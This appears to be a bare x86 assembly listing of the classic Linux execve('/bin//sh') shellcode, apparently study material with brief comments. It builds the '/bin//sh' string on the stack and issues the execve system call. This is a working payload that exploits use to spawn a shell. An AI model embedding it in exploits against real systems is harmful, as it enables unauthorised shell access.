section .text
global _start

_start:
   xor eax,eax
   push eax
   push 0x68732f2f ; '//sh' (hex =>littel endian)
   push 0x6e69622f ; '/bin' (hex => littel endian) EXECVE ([XX]:ESP)
   mov ebx, esp
   xor ecx,ecx
   xor edx, edx
   mov al, 0xb
   int 0x80